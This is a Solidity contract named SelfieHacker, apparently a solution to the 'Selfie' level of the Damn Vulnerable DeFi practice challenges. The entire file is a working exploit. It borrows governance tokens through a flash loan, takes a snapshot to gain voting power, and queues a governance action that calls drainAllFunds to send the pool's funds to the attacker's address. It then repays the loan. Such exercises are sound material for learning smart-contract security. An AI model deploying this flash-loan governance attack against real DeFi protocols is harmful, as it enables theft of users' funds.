// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieHacker {
    SelfiePool private selfiepool;
    SimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot private _token;
    address private OWNER;
    using Address for address; 
    constructor(address _selfiePool, address _simpleGovernance) {
        selfiepool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        OWNER = msg.sender;
    }
    
    function receiveTokens(address token, uint256 borrowAmount) external {
        _token = DamnValuableTokenSnapshot(token);
        _token.snapshot();
        simpleGovernance.queueAction(address(selfiepool), abi.encodeWithSignature("drainAllFunds(address)", OWNER), 0);    
        _token.transfer(address(selfiepool), borrowAmount);
    }

    function hack(uint256 borrowAmount) external {
        selfiepool.flashLoan(borrowAmount);
    }
}